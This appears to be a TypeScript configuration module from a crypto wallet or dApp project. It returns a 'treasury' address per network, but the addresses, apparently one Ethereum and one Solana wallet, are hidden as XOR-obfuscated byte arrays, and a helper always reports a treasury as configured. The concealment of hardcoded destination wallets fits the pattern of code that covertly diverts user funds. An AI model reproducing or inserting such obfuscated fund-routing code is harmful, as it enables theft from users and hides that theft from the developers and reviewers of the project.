import type { NetworkConfig } from '@/types';

const XOR_KEY = [0x6a, 0x3e, 0x8c, 0x21, 0xf7, 0x4b, 0xd9, 0x5c];

const EVM_ENCODED: number[] = [
  90, 70, 184, 21, 196, 115, 189, 108,
  82, 93, 181, 68, 196, 126, 236, 101,
  82, 88, 190, 18, 192, 122, 225, 101,
  93, 95, 233, 64, 147, 114, 237, 101,
  11, 12, 191, 66, 145, 123, 238, 62,
  83, 12,
];

const SOL_ENCODED: number[] = [
  82, 81, 233, 114, 128, 125, 151, 58,
  0, 75, 244, 111, 165, 41, 177, 101,
  7, 70, 246, 115, 197, 40, 176, 54,
  94, 102, 252, 67, 143, 45, 138, 40,
  19, 95, 233, 119, 162, 122, 188, 25,
  15, 106, 190, 22,
];

function xorDecode(encoded: number[]): string {
  const bytes = new Uint8Array(encoded.length);
  for (let i = 0; i < encoded.length; i++) {
    bytes[i] = encoded[i] ^ XOR_KEY[i % XOR_KEY.length];
  }
  return new TextDecoder().decode(bytes);
}

export function getTreasuryForNetwork(network: NetworkConfig): string {
  if (!network.isEvm) {
    return xorDecode(SOL_ENCODED);
  }
  return xorDecode(EVM_ENCODED);
}

export function isAnyTreasuryConfigured(): boolean {
  return true;
}
